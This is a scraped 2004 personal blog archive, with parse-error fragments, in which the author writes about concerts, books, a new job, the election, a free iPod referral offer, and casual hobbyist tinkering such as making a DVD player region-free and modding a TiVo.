and forth to deal with the desity of the descriptions. I love books.&lt;br /&gt;&lt;br /&gt;i wish I had a whatiamreadingBlogger program. maybe I will write one. something that hooks into that site - umm - &lt;a href=&quot;http://www.allconsuming.net/&quot;&gt;allconsuming.net&lt;/a&gt; and allows a person to easily and quickly update their reading list. I found that the site - althugh cool - was slow and clunky. which really made it annoying for me. &lt;br /&gt;&lt;br /&gt;i find it humourous how I am attempting to &quot;desktop clientize&quot; all of my favorite websites. but they are super thin clients. super super thin. like my fancy pants. &lt;br /&gt;&lt;br /&gt;ook. I need sleep. and I am at work. so I am stuck working. and not sleeping. I wish I could pause the day and sleep. omg I would age fast. I would pause it and sleep and sleep and sleep - and then unpause it. I woudl then inadvertently live like 3 days for everyone elses one day. I need to read more time travel books. </pre></p>

                <p>i was playing around with my blog software and I noticed something pretty cool. I have taken over 1000 pictures with my nokia cell phone cam and have roughly 2525 pictures total in my photolog. I have taken pictures of a bunch of neat stuff. it is pretty cool. I have wanted to make a view that is the text from the blog and the pictures all in one fancy view. but I haven&#8217;t. maybe soon. haha. <br /><br />today I received my free ipod mini. wtf. so apparently it works. I really don&#8217;t know what to do with it. I guess use it. I feel weird getting a free thing this expensive. but I guess shit like this happens all the time. heh. I also picked up the best invention in the world: the <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/081220042347/Nokia6600(029).jpg'>tvB-gone</a>. basically it turns off all the tvs in its immediate view by sending out the commonly known IR off signals for north american tvs. it rules. all yesterday I was playing around at stores - turning off banks of tvs. it ruled. <br /><br />i am attempting to pound out this site I am working on. it is kinda a pain. but whatever. I will finish er off. tonight is the first night I awhile I have been up past 1am. and I am not actually up past 1 yet. haha. I hope I don&#8217;t screw this up. ;)<br /><br /><a href='http://www.nbc4i.com/news/3983630/detail.html'>this</a> is absolutely insane. <blockquote><small>"Two members of the heavy metal band Damageplan were reportedly shot and killed, including Dimebag Darrell, formerly with the band Pantera, NBC 4's David Wayne reported. The other band member's name was not released. The alleged gunman also died at the scene, Wayne reported."</small></blockquote></p>

<p>woah. wtf. metal is getting out of hand. the people who listen to it are mentally unstable. it is absolutely true. <br /><br />in other news - I saw cradle of filth last night. they sucked. well not sucked like were horrible - just not as good as <a href='http://www.the-gothicworld.de/cdreviews/09-2003/dimmu-borgir.jpg'>dimmu borgir</a>. also - it appears that <a href='http://cof.rockmetal.art.pl/images/galeria/1.jpg'>danny filth</a> has an unreasonably <a href='http://cof.rockmetal.art.pl/images/galeria/13.jpg'>large head</a>. it was nuts. he runs out on stage - and I was like - wtf. and I laughed. and then lost interest. however I gained interest in a band called <a href='http://www.trustkill.com/multimedia/videos/bleeding_hail.html'>bleeding through</a>. not really anything new. but good energy. and there is a pretty girl playing keyboard. haha. what a dumb metal guy thing to say. silly silly. <br /><br />i think I am going to get a <a href='http://www.stripper-faq.org/'>new job</a>. oh wait I am not a hot girl. so I guess I am not going to. but if I become a hot girl. hells yea. speaking of hot ladies - lately I have been playing with OS X a lot. it rules. so so so smooth. I like it. basically I just ssh into it and play how I like. none of that monitor nonsense. just shell all the way. I love it. <br /><br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

                <p>so everyone is asking me how I got the free ipod. well. iw ill detail the steps: &lt;blockquote&gt;&lt;small&gt; &lt;ol&gt; &lt;li&gt; I went to freeipods.com and signed up (june) &lt;li&gt; I posted the referer info to all my friends - no one did it ;) &lt;li&gt; I posted the referer info to nata2.info ( a pretty high bandwidth site) and a lot of people signed up and no one completed the offer. &lt;li&gt; I waited 6 months &lt;li&gt; I randomly checked and had 5 completed offers &lt;li&gt; it took a little less than one month for them to send it. &lt;li&gt; I got it. &lt;/ol&gt; &lt;/small&gt;&lt;/blockquote&gt;</p>

<p>see easy. it took about 6 months. but I didn&#8217;t proselytize much. all I did was sit here and think about it. well not even that. I figure if you got a bunch of friends together - you could all get ipods for free. so try it out. right now I am fighting for a <a href='http://www.freegamingsystems.com/?r=12842595'>free nintendo DS</a>. do it. DOOO it. <br /><br />i wonder if this means I am going to start blogging again. <br /><br />i wonder if <a href='http://www.hackaday.com/entry/1234000567023127'>this</a> means I am going <a href='http://www.engadget.com/entry/1234000610023097/'>change the graphics</a> on my brand new ipod mini. I hope so. <br /><br />what do you want for christmas?</p>

                <p>work is awesome again. on friday I did a bunch of stuff getting acclimated with flash and such. kinda fun. then I got bored and wne to drop off some cds to my &#8220;boss.&#8221; he was in his office with this dude listening to music. they were listening to death from above 1979. so I hung out and we all talked about death metal for about 40 minutes. totally awesome. I love it. <br /><br />then me and some friends went to hard rock hotel. then we went to old timers. then rainbo. then empty bottle. then I was tired and drunk. so I went home. heh. and passed out until 3am at which time I packed for colorado. then I flew to colorado. then I was tired again. hah. so I took a nap. went to lunch with the fam. then took a nap again. now I have slept all day. and am starting to feel normal. <br /><br />it is snowing here and is quite pretty. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;some very interesting things are happening in my life. totally changing everything. &lt;br /&gt;&lt;br /&gt;i just heard a cat meowing so I opened the closet and let my parents car out. hah. silly kitty. during my first nap I had a really weird dream about a cat who was hurt. and as the dream progressed. the cat got more and more human like. until in the end it was a human cat hybrid. and totally hot. hahaha. &lt;br /&gt;&lt;br /&gt;my free ipod order was submitted and passed verification. now they are processing it. hopefully I get it. I have passed all of the steps so far. maybe I will get a silver ipod in a couple days. then. if that works. I am going to try and get the free plasma screen tv. hhaha. ok. the cat is on my lap. not letting me type. I will go now. ready. cat typing: </pre></p>

                <p>seriously I do. my new goal (well it is the same as my old goal - but with a bit more randomness) is awkwardness, juxtoposition and hyperbole. so basiclaly my life. hah. but I am excited. for the next couple days. work is becoming ultra cool. I think their will be some nice changes soon. it just seems like their will be. like the wind is blowing change my way. I do think it is funny - I could be the veritable harbinger of death and sorrow for developers - for I have never worked anywhere where as soon as I get hired the lead developer doesn&#8217;t quit. I think that is weird. maybe they just catch &#8220;wind&#8221; of my skillz. haha. whatever. anyway. regardless of my nonsense words. I am pretty excited about work. I want to do more faster. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;so after work there is going to be fun too. mike and my friend &lt;a href=&quot; http://www.livejournal.com/users/caerrie/&quot;&gt;carrie&lt;/a&gt; are driving up from greality to come see the pixies tomorrow night. they will arrive tonight. the fun thing is - mike nor me have ever really met carrie. I have talked to her briefly while sleeping and chatted with her a number of times. I have followed her blog for awhile but yea. it is going to be awesome. or really weird and awkward. I vote for awesome. I am excited. EXCITED. hah. anyway. this brings me to the pixies. soooo. the pixies were incredible. I was very very happy to see them on saturday. they played an incredible set. all the songs I wanted to hear (except alec eifel). and they were just generally thrilling to see. kim deal was so nice. they did not talk a lot. really it was awesome. or it was awesome, really. &lt;br /&gt;&lt;br /&gt;i am going to retire soon. to bed. I need to do work. now!</pre></p>

                <p>this morning I woke up early. like 7:00. I was having a dream wher ei was invader zim and I was able to time travel (a combination of the two things I did last night between 2:30am and 4:00am). it ruled. I just buzzed around and had time traveling problems. I am currently reading this book by authur c clarke. it rules. I forgot what it is called. I have not bothered to look at the titles of the last two or three books. I find it interesting. I have also read a damned lot in the past couple weeks/months. it kinda rules. I shoudl reallystart a book log. haha. that lists all the books I have read and what I thought of them. it might be interesting. maybe I will do that. maybe I will. maybe. I will. <br /><br />punctuation is sometimes annoying<br /><br />i don&#8217;t think I have one good friend who hasn&#8217;t commented on the lack of blog entries I have made since I started my new job. it is cool to see that people are reading my blog. but it is sorta annoying that I have that as a following. I mean. I never did it expecting that I would be expected to do it again soon. heh. yea know. I just do it right now. and then if I do it again soon. it is almost a coincidence that I continue everyday. I never realized that people read it. haha. even thought he stats tell me otherwise. I may be stuck in my own universe. hmm. could I be? <br /><br />i miscalculated my pay periods and I have totally screwed myself. haha. rule. I shoudl plan ahead more. and plan on buying less stuff. stupid buying. stupid money. nata2 is in dire straits. we shall see how this turns out. I think possibly ok. but eep. I hope so. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;stupid money&lt;br /&gt;&lt;br /&gt;oh oh oh. I purchased a new dvd player and haxored it into being region free. I got the &lt;a href=&quot;http://www.amazon.com/exec/obidos/external-search/107-8488385-1006951?tag=nata2productions&amp;mode=blended&amp;keyword=cyberhome&quot;&gt;Cyberhome CH-DVD 320&lt;/a&gt; at target for $38.00. it is about the size of a large 80s portable cd player. heh. or about the size of a sega genesis (sorta with a bit shaved off and it looks cooler). so I haxored it real easy like:
&lt;blockquote&gt;
&lt;small&gt;
Turn on power (with no disc inserted) &lt;br /&gt;
Press Menu, 1, 9 &lt;br /&gt;
Select the Region option and press Enter &lt;br /&gt;
Key number of desired region or 0 for region free &lt;br /&gt;
Press Enter again to save changes &lt;br /&gt;
Press Eject and insert your DVD 
&lt;/small&gt;
&lt;/blockquote&gt;
now it plays ALL my dvds without fail. we watched &lt;a href=&quot;http://www.imdb.com/title/tt0363226/&quot;&gt;Zat?ichi&lt;/a&gt;. it was incredible. next is &lt;a href=&quot;http://www.imdb.com/title/tt0308379/&quot;&gt;dark water&lt;/a&gt;, &lt;a href=&quot;http://www.imdb.com/title/tt0269266/&quot;&gt;nightmare&lt;/a&gt;, then &lt;a href=&quot;http://www.imdb.com/title/tt0338763/&quot;&gt;battle royal 2&lt;/a&gt;, then whatever and then whatever, and then whatever. it rules. I can order from hivizone with reckless abandon (whereas before I was so so conservative with my 100s of hong kong dvd orderings). you can never have &lt;a href=&quot;http://dopeman.org/movies/&quot;&gt;enough&lt;/a&gt; I guess....</pre></p>

<p>politics are dumb. tonight I get to go see fear factory. then to see the movie the grudge. I am excited. although really hungry. ;)</p>

                <p>at about 3. I then went to watcht the incredibles with hiromi. it ruled. I liked it a lot. <br /><br /> then I went to target and got a no region dvd player. it ruled. we then came home and watched zatoichi. soooo good. I am sleepy nwo - however I MUST clean my room. it is a mess for sure. <br /><br />recently I have been thinking a lot about some decisions I made in the last week - I think I mistreated one of my friends. it is sad. she is upset. as well as i. however I don&#8217;t think it is reconciable at this point. sometimes learning is difficult - expecially when I am both the bad example and the student. hah.

                <p>so basically I haven&#8217;t updated this thing in about 3 years. which is a long time. so I am going to &#8220;update&#8221; yall as to my whereabouts. <br /><br />so. I got this new job. it is taking a lot of my time. it rules. but I am in a different paradigm than I was when I was at the WB. basically I am totally engaged for 8 hours. I have to be much more accountable and I have to really justify my actions. this is good for me. it is a situation which allows me to grow. and if things work out how they &#8220;should&#8221; then I will be sitting pretty. maybe I will win. my goal is to be in a place that gives me the freedom to do what I would normally do (just fuck around all day) but in a corporate environment which I get rewarded in. I think this may be it. I am pretty excited. or I will get fired for looking at porn as usual. <br /><br />so I am pretty disappointed in the election results. but I feel that we got our just deserve. the american people have spoken. and we now get to live with the results. so I guess now we need to just make sure we don&#8217;t blow everyone up. I am doubtful things will get a lot better. I just hope it stays entertaining. and it will. I know it. <br /><br />i haxored my tivo something fierce. I am currently downloading the election night daily show to burn to a cd and give to matiss. then he can watch it. awesome. I rule. <br /><br />i want to be fancier. soon. I think my new goal is to make my apartment a cyborg apartment. with robots. I wanna get rid of all the crap I got on ebay. and make the place fancy. like with some interesting computer integrated experiments. I think it will rule. speaking of that. I need to send invoices. or I am going to be making a computer aided sad face when I lose all my moneys. <br /> stupid stupid moneys. <br /><br />stupid monkeys. <br /><br />so this weekend was awesome. I went to nyc to hang out. I got <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A31_halloween_nyc'>pictures</a> to prove it. I hung out a bunch with my friend <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A31_halloween_nyc&img=IMG_2231.jpg'>natasha</a>. she is awesome and really fun. it ruled.

                <p>omfg. so that sucked. <br /><br />it was pretty harrowing to watch unfold. I mean. it appeared that we didn&#8217;t even have a chance. and then I started drinking. which made the whole thing rediculous. I am now sleepy from drinking too much with too little food and too little consideration for reality. all I remember is laying on my bed and calling for my friends. then wooosh - morning. heh. and then we get bush for another four years. why is this how america rolls. this isn&#8217;t rolling hard. this is rolling idiotically. I mean seriously. besides an isolationist, negative foreign policy and a hatred of foreigners what have we gained? oh yea. I forgot - war. nice. stupid war. stupid bush. haha.

                <p>so. I have been formulating this post since the last one went live. so about a week or so. a lot has happened in the last couple weeks. mostly insanity. but whatever. <br /><br />i totally don&#8217;t feel it. I will be working on some stuff later. I will feel it then. I hope. I will blog then. <br /><br />i have some exciting new news I can&#8217;t tell anyone about. no one must know my secret. until it is too late to be a secret that is. I am sure I won&#8217;t be able to keep my secret. so you will know soon. <br /><br />i am excited.<br /><br /> I had a good weekend. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A31_halloween_nyc'>here</a> are pictures.<br /><br /> since wednesday - falaphilia.com pulled 3.7 terabytes of transfer. that is a lot. for those of you that don&#8217;t know. my friend just got a new hosting plan and his plan offers him 1000mb a month. so if the trend I exhibited continued for a month I would have pulled 20000mb a month. that means that I would owe about 1 billion dollars. w00t. I rule. <br /><br />apparently kerry is winning by a landslide. my friend who has a friend on the inside says that &#8220;The Democrats&#8217; polls show a huge margin, while the GOPis admitting to only a slight lead thus far&#8211;but according to theseoff-the-record sources, people in the GOP headquarters are already in tears.&#8221; woah. awesome. <br />i wonder what will happen in an hour. then two. then four years</p>

<p><b>[@vanwinkle]</b> is harper giving up blogging?<br /> <b>[clock]</b> yeah I think so its been forever<br /> <b>[@vanwinkle]</b> whatever happened to three post per day minumum?<br /> <b>[@scottv]</b> he got a job &lt;/small&gt;&lt;/blockquote&gt; So basically I have been just chilling out hard. not doig anything. I get home and I don&#8217;t play computer or anything. I really should. I have so many projected that I should finish. they would be easy. and I could make some quick cache. but oh no. I just sit around. and read. I think that is all I have done in my house the last couple months. that and play video games. I lead the life of a philosophy student/<a href='http://nata2.info/?path=pictures%2FIncoming&amp;img=high_times.jpg'>stoner</a>. except I don&#8217;t <a href='http://nata2.info/?path=pictures%2FIncoming&amp;img=fires-colo062002.jpg'>smoke</a>. heh. and I am not lame. oh wait. ummm. yea. <br /><br />hmmm lets see. the last time I updated my blog was in 1983. what has happened since. well I graduated elementry school and moved on to middle school. I saw david bowie. umm. what else. <br /><br />i need a mirror so I can see when people are entering my cube. it is killing me. I keep &#8220;feeling&#8221; movement and it is destroying my life. I keep snapping my head around and I am starting to get a neck ache. ;) <br /><br />anyway. a bunch of fun stuff has happened since I last posted. nata2.info stills pulls a BUNCH of bandwidth. as of today it has pulled about <a href='http://www.google.com/search?hl=en&lr=&c2coff=1&client=firefox-a&q=725266224+kilobytes+to+gigabytes&btnG=Search'>
691.66777 gigabytes</a> in october. wtf. that is 2350920 hits and 249529 pageviews. roughly 39057 visits. heh. that rules. I have conceptually had my entire home town visit my website. almost. well not really at all. but a town of almost 39k. hah. stupid numbers. also on the popular site front - the falaphilia site peaked with 24353 visits in one day and has dropped to less than 150 in a week. We were mentioned on numerous news sites and got quite a bit of <a href='http://www.google.com/search?q=falaphilia&start=0&start=0&ie=utf-8&oe=utf-8&client=firefox-a&rls=org.mozilla:en-US:official'>blog coverage</a>. it was pretty nuts. I like it when the internet is awesome. <br /><br />i wonder what will be next. I got some ideas. but I need something to help me execute them. possibly time. haha. that is why we just subscribed to direct tv. I am going legit. I did however hack the shit out of my tivo. so now I get all the fancy backdoors and such - but I am a legit subscriber (of both tivo and dtv - wtf). It was pretty fun to do. I didn&#8217;t have to do any of the hard stuff. the <a href='http://dopeman.org/directivo'>directivo scene</a> has everything pretty solid. the hacks I applied are as follows: upgraded my drive to 160gb (120 usable), upgraded the OS to 4.0whatever (found on emule w00t - supports wireless internet updating and such native), enabled telnet, tivoweb, ftp, mfs_ftp, tytools and all that jazz, unscrambled the recordings and applied a couple misc hacks for good measure(perm 30 sec skip). It is a nice device now (whereas before it sucked??). I can&#8217;t wait until I get the streaming from the tivo working. I will be able to watch my shows from my computer - while matt or matiss are playing video games. after times like this I remember how awesome I am. haha. I rule.</p>
<br />
<p>so saturday - we went to see suzanne and co at Y bar. but the doors were closed so we waited outside until amjad and friends shoed up for some soundbar action. we <a href='http://nata2.info/.thumbnails/pictures/events/2004%3A10%3A24_Amjad_in_chicago/IMG_2063.jpg'>hung</a> <a href='http://nata2.info/.thumbnails/pictures/events/2004%3A10%3A24_Amjad_in_chicago/IMG_2062.jpg'>out a bit</a>. then we went to crobar. where it was madness. Hiromi and I ended up riding the train home at 6:30am. hah. rule. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A24_Amjad_in_chicago'>here are the pictures</a>. then last night, <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A24_Halloween_Movieside&img=IMG_2204.jpg'>matiss</a> and <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A24_Halloween_Movieside&img=IMG_2119.jpg'>I</a>, <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A24_Halloween_Movieside&img=IMG_2122.jpg'>juggled</a> at a film fest for rusty nails. it ruled. I got real real tired. we made zombie clothes by cutting up old clothes - then taking them outside and <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/251020041248/Nokia6600(728).jpg'>burning them</a>. it was awesome. the show went really good. check out the pictures <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A24_Halloween_Movieside'>here</a>. <br /><br />i am now going to get my vote on. my absentee vote. cuz my work is sending me to salt lake city for training. it will be pretty interesting. I have never been there - and I imagine that it is pretty crazy. crazy like a church. I will have to bring a couple books. what is crazy is my life starting on friday. first I leave for nyc to hang with some friends. I am really excited. then I have crazy parties. then I fly from nyc to cincinnati at 6am, then from cincinnati to salt lake at 8:40am. haha. keep in mind that I am going to a halloween party on sunday that will go until late. hah. I am screwed. luckily I have a cross country flight and won&#8217;t be in meetings until the afternoon session. I will also be able to catch up on my rest. w00t. <br /><br />my friend angus lent me his newton pda. I am pretty excited. I am going to review it and post my findings on <a href='http://3gcoding.com/'>3gcoding</a>. I want a miniture phone. give me one.</p>

                <p>however, I don&#8217;t feel very tired. I really don&#8217;t understand how it is that I am able to lead this weird dual life. my friend adam equated it to the original mods from the 50s and 60s. he said they used to have normal jobs(working 9-5) and look like business people - then after work they would transform into these fashion seeking scene people. right after my friend adam told me this he started shouting &#8220;prolatariet.&#8221; but anyway - I sometimes don&#8217;t understand how I find my self at work less than 6 hours after I was last &#8220;out.&#8221; regardless of the activity - I am always &#8220;out&#8221; before going to work. weird. I am lost in my typing.</p>

&lt;Br&gt;&lt;br /&gt;so this weekend was pretty fun. it as always started on thursday with &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A07_tommie_at_metro&amp;img=IMG_1964.jpg&quot;&gt;tommie spinning&lt;/a&gt; at smartbar. &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A07_tommie_at_metro&amp;img=IMG_1954.jpg&quot;&gt;danielle&lt;/a&gt; and I &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A07_tommie_at_metro&amp;img=IMG_1958.jpg&quot;&gt;hung out&lt;/a&gt; there. a lot of fun. I wasn&apos;t really into being crazy and danielle wsa tired and claims not to be a dancer(we will soon see the truth) - so it was a pretty chill night out. a lot of fun. I took a &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A07_tommie_at_metro&amp;img=IMG_1968.jpg&quot;&gt;neat picture&lt;/a&gt; of &lt;a href=&quot;http://morganbreaksthings.blogspot.com/&quot;&gt;morgan&lt;/a&gt; and &lt;a href=&quot;http://thatswherebatslive.blogspot.com/&quot;&gt;miles&lt;/a&gt;.

&lt;br /&gt;&lt;br /&gt;on friday I went home after work and changed into my &quot;young republican&quot; clothing to enable me to participate in my local political gathering. I met &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A09_debates_and_crobar&amp;img=IMG_1978.jpg&quot;&gt;scott, jeff&lt;/a&gt; and &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A09_debates_and_crobar&amp;img=IMG_1979.jpg&quot;&gt;monica&lt;/a&gt; at frankie Zs bar on clark for a kerry event to support him during the debates. it was pretty fun. I think we were rowdy.  and then with stops to hard rock hotel bar, sugar and a porn store, we finally made it to crobar. heh. were we met &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A09_debates_and_crobar&amp;img=IMG_1982.jpg&quot;&gt;hiromi&lt;/a&gt;. it was pretty fun. my friend &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A09_debates_and_crobar&amp;img=IMG_1990.jpg&quot;&gt;tracy&lt;/a&gt; and a bunch of her friends also participated in the insanity. it was a pretty fun night. after crobar - we went to redno, and then my friend james&apos; space for an after hours and then to scotts house. omg. I got home at around 6:30am. I was not aware that flash taco has a closing time. haha. &lt;br /&gt;&lt;br /&gt;so then on saturday I needed to rest. so I did. I went to bed bath and beyond and picked up some stuff with matiss. the sales people reacted pretty funny to us. I mean we don&apos;t look your typical lincoln park hotties. well I don&apos;t matiss on the other hand. seriously looks LP. totally trixie. it ruled. so now I can&apos;t wait for the cold to come. all I want to do is to snuggle into my bed. with soft things and read books that are dark. dark like my heart. after our excursion - I went with hiromi and jordan to a bbq. and then I went to corbar to pick up some money that jordan was owed. we drank lots and forgot the money. stupid bars. then I went to bed. pretty early for a saturday. I missed hanging out with some people which sucked. but I got to sleep. &lt;Br&gt;&lt;br /&gt;so on sunday - I played a bunch of video games with matt and matiss. it ruled. then I returned some stuff to BBB. heh. lame. then I went to an awesome bbq at chao&apos;s house. then game night at my place. we played this awesome game called bang. and then a couple games of speed scrabble. at that time I went to claudia&apos;s BBQ at this guy lloyds house. it was fun. really really good pork chops. heh. I love bbqs. after the bbq I went to exit with devon. it was fun to hang out. we then went to her place and had tea and hung out with her dog. I got home at 3. and slept really well. &lt;br /&gt;&lt;br /&gt;this week will bring some fun stuff going down. I am finally getting work to do at my job. we are in the middle of launching some stuff so everything si really on hold. I will soon be effective. haha. &lt;br /&gt;&lt;br /&gt;my friends are all going to india in january. stupid non-corporate workers. I want to go. </pre>

                <p>last night was pretty fun. I hung out with hannah. we went to the faint. but first I slept until 8. rule. I love naps. I nede to eat better and sleep better. that is the way to the future. anyway. I hung out with hannah and we saw the faint. it was pretty good. tv on the radio ruled me. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;3. I was so surprised at how hard they rocked. the guitar was incredible. so drilling. I loved it. &lt;Br&gt;&lt;br /&gt;so I started my new job. I haven&apos;t really updated this in awhile. but I did start. it is a lot more fun than my last job. it is weird how the attitudes/mood of the organization affects a person. at the WB I felt totally stifled. like I wasn&apos;t able to be myself(i forced it on them) and I wasn&apos;t able to do everything that I know how to do. I wasn&apos;t allowed to be an expert in my field. here however - they leverage the smarts a person has and they try and use every bit of it. it rules. by the second day I felt a lot better about everything and I really was happy I had made this decision. &lt;br /&gt;&lt;br /&gt;i don&apos;t have a lot of work yet. but that will all change as I become more acclimated with the environment. everyone else is working very hard - launching things, meeting deadlines. I am excited to be in code soon. and to understand more the ceiling and floor of the situation. at that point I will know how much I can do/get away with - both in regards to my self and with the company. the weird thing is that when I am herei totally don&apos;t mind staying late. because I don&apos;t hate it fundamentally. I get to wear jeans. I get to come in at 9ish. etc etc. rule. but overall I just feel better. it could be jus the fanciness of the new. but it also could be working among people who want you to be smart. not that my team at wb didn&apos;t want me to be smart - but they limit themselves and the non-technical staff controls and ultimately destroys the projects there. it is sad. &lt;br /&gt;&lt;br /&gt;as I have been taking it very chill. just working, then coming home and reading. it rules. that last comma probably doesn&apos;t need to be there. anyway. I have been reading a bunch of banana yoshimoto. she is really good. all o fher books talk a lot about death. I think I read somewhere that her books are &quot;always talking about death but never let the reader forget that life must go on.&quot; or something like that. it seems that is in fact what she does. I finished asleep the other day and it was so full of sorrow. a trio of sad stories - but in every story the reader is led through this emotional world where things aren&apos;t working correctly and where things are depressing - but I found that I never leave the books depressed. they don&apos;t sit heavy. they leave the reader feeling satisfied - as if the protagonist has fulfilled whatever they are missing. they are really beautiful novels. they are also so tiny. I just got done with amrita. it was a mess. my favorite part was after finishing it - there is an apology from yoshimoto apologizing for the mess of a novel it is. she seemed upset that it was long and tenuous. heh. it was. but it was still good. I laughed in the beginning when suddenly they brought up philip k dick&apos;s novel &quot;flow my tears a policeman said.&quot; it made me want to read dick again. you know how I love dick. haha. umm that was for you mike. &lt;br /&gt;&lt;br /&gt;the wierdest part of getting a new job is the commute. seriously. it hasn&apos;t changed at all. nothing has changed except the &quot;building&quot; and the elevator bank. it is so strange to see the same people. walk the same streets. but not be involved in the same way. yep. &lt;br /&gt;&lt;br /&gt;so I also got this book called &quot;Haruki Murakami and
the Music of Words&quot; by jay rubin. rubin is my favorite translator of the murakami stuff. he lays it down so beautifully. it really recreates what I imagine to be incredible script. the &lt;a href=&quot;http://www.complete-review.com/reviews/murakamih/rubinj.htm&quot;&gt;reviews&lt;/a&gt; seem to suggest that it isn&apos;t really that great of a book. or well at least it isn&apos;t as complete as you might imagine. however. I just want to know more. apparently haruki murakami is now the most widely read japanese author (in the west). haha the west. yea. but I do find it odd that the most widely read japanese author in the west writes very strange dark tales that are both weirdly erotic and dark beneath all perception. the impression that gives to japan. heh. poor japan. always so so dark. they should turn a light on.&lt;br /&gt;&lt;br /&gt;i don&apos;t have a lot to say. generally. but apparently not writing for a couple weeks will make me a bit more verbose than usual. &lt;Br&gt;&lt;br /&gt;work gave me this new laptop. it rules. well sorta. it is full of &quot;business&quot; features. but the one feature which seriously seriously rules is the built in LED light on the top of the screen. I am so amazed at the throughthought of this laptop. (is throughthought a word. I doubt it. I imagine it is two words. I like it as one word. it reminds me of 1984.) my keyboard rest is going to kill me. I need my docking station, a monitor and a better keyboard.    wierd. yea then it will be better. &lt;Br&gt;&lt;br /&gt;  &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A01_last_day_of_worldbook&quot;&gt;here&lt;/a&gt; are some picture of my &quot;last day&quot; party with my coworkers. it was trouble. serious. serious trouble. but honestly not as much trouble as the last bbq at claudias house. pictures are &lt;a href=&quot;http://nata2.info/?path=pictures%2Fevents%2F2004%3A10%3A03_Claudias_bbq&quot;&gt;here&lt;/a&gt;. now that was some trouble. I woke up on monday for the first day on my new job with a bunch of bruises, a scrape or two, four temp tattoos on very visible parts of my body and a cigarette burn on my neck. wtf. it was one of those situations where you exclaim happiness that life is as fun as it is. but then you duck and hope to sleep for the rest of winter. &lt;br /&gt;&lt;br /&gt;so I have been hanging out on the internet with my friend natasha. she sent me a bunch of stuff from her work. which I promptly wore and created &lt;a href=&quot;http://nata2.info/?path=pictures%2FIncoming&amp;img=high_times.jpg&quot;&gt;this action shot&lt;/a&gt;. those who know me well will realize the pure humor in this. those that don&apos;t know me possibly will not find as much humor in it. I laughed a lot. &lt;br /&gt;&lt;br /&gt;a couple weeks ago I had a chance to play with this strange little contraption called the ogo. it rules. I posted a review of it &lt;a href=&quot;http://3gcoding.com/archives/2004/09/ogo_review.php#more&quot;&gt;here&lt;/a&gt;. check it out. &lt;br /&gt;&lt;br /&gt;anyway. I am probably back. I need a nap. so that means I am somewhere. which is half, if not three fourths of the battle. &lt;br /&gt;&lt;br /&gt;i love battles.&lt;br /&gt;&lt;br /&gt;i almost believe that kerry might have a chance. weird. stupid hope. &lt;br /&gt;&lt;br /&gt;my new plan is to eat more at home. I have a crock pot and I just got a rice cooker. I am going to have roast and rice every night for the next 6 months. totally atkins. I will be so fat it will be hard to understand the reality of the situation. rule. &lt;br /&gt;&lt;br /&gt;i also broke and fixed the photolog. it is a hack. but will work for now. I am pretty excited. I started goign to juggling again. it rules. I am working on solo clubs. it is really cathartic and I really enjoy it. so relaxing. so last week I was talking to my frien angus who was on the newton team and he said he would lend me his newton for a week or so to play with it. so excited. I love devices. maybe I will write a review of it. haha. compared to the new devices I have used. I am pretty thrilled. stupid apples. &lt;br /&gt;&lt;br /&gt;i ate two bananas this morning. </pre></p>

                <p>so i accidently broke my webserver. haha. well by accidently i mean i am in the process of moving all my important and not so important sites to my new webserver so in the process i broke it. it sucked. but now it is mostly back to normal. everything is pretty much the same except i am unable to officially do my photolog right now. but i still update the master &#8221;<a href='http://nata2.org/photolog.php?expand=1'>moblog</a>.&#8221; so check it out. <br /><br />work is weird right now. today i moved all my stuff from my cubical. like four boxes of crap i have collected - mostly nick nacks and such. it was nice to remove it but also sad. transition is totally hard. and i am in the thick of it. all i do is wonder. haha. but whatever. it will be a nice change. <br /><br />my laptop is totally fuxored up. the wireless doesn&#8217;t work with my router. it possibly could be my router. but maybe not. it has been flaky today. lame. <br /><br />i am kinda tired. today i inadvertently slept all after noon. i missed like two meetings i had with friends. it sucked. but i apparently needed the sleep. <br /><br />i am still reading my &#8220;dark japanese fiction.&#8221; today hiromi told me that try as i might i will never become japanese. i laughed. i am applying now to teach english in japan. haha. and i just purchased a bunch of anime. and i totally download asian porn all day. well those things are all not true - except for hiromi telling me that i am not japanese. anyway. yesterday i read kitchen by bana yoshimoto. it was so good. very very sad. but also nice and happy. i hate that my vocabulary causes me to describe books as nice. i wish i could actually use words that are appropriate rather than nice, good and like. someday i will be a real boy. i promise. <br /><br />ok now i am going to debug fopen and webpages on my new box. <br /><br />btw this is the new server. <br /><br />btw btw. it is still broken</p>

<p>I got my OGO in the mail today and have been using it on and off all day. It is a pretty cool device. Unfortunantly (as any new device) it has some pretty annoying bits to it. I will give a basic rundown of the features as i see them.</p>

